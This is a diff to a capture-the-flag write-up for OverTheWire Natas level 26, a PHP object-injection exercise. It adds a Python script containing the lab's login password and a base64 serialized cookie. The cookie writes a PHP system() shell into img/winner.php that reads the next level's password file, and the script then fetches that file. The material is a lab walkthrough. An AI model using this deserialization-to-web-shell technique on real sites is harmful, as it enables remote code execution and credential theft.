@@ -74,7 +74,7 @@ $object = new Logger();
 echo(base64_encode(serialize($object)));
 ?>
 ```
- 
+- make sure you run this code with php version 7 only as it only runs on that version
 in order to run php directly on kali  - 
 ```
 php7.0 file_name.php 2>/dev/null
@@ -82,11 +82,30 @@ php7.0 file_name.php 2>/dev/null
 the output will be a base64 string 
 we set that b64 string to our drawing cookie 
 
+```
+import requests
+username = 'natas26'
+password = 'cVXXwxMS3Y26n5UZU89QgpGmWCelaQlE'
+
+url = 'http://natas26.natas.labs.overthewire.org/'
+session = requests.Session()
+response = session.get(url,auth=(username,password))
+
+response.cookies['PHPSESSID']
+
+session.cookies['drawing'] = 'Tzo2OiJMb2dnZXIiOjM6e3M6MTU6IgBMb2dnZXIAbG9nRmlsZSI7czoxNDoiaW1nL3dpbm5lci5waHAiO3M6MTU6IgBMb2dnZXIAaW5pdE1zZyI7czo1MDoiPD9waHAgc3lzdGVtKCdjYXQgL2V0Yy9uYXRhc193ZWJwYXNzL25hdGFzMjcnKTsgPz4iO3M6MTU6IgBMb2dnZXIAZXhpdE1zZyI7czo1MDoiPD9waHAgc3lzdGVtKCdjYXQgL2V0Yy9uYXRhc193ZWJwYXNzL25hdGFzMjcnKTsgPz4iO30='
+
+response = session.get(url+'?x1=0&y1=0&x2=55&y2=500',auth=(username,password))
+print(response.text)
+```
+
 after doing this we encounter a fatal error, we know that this means that our code successfully executed we know that we got that object to unserialized
 
-
-
-
-
+we then change the `get` request to fetch to winner.php file that we manipulated 
+```
+response = session.get(url+'img/winner.php',auth=(username,password))
+```
 ### References
 https://www.youtube.com/watch?v=IgxhtJQL-gY
+php magic methods - https://www.php.net/manual/en/language.oop5.magic.php
+php version 7.0.33 - https://onlinephp.io/
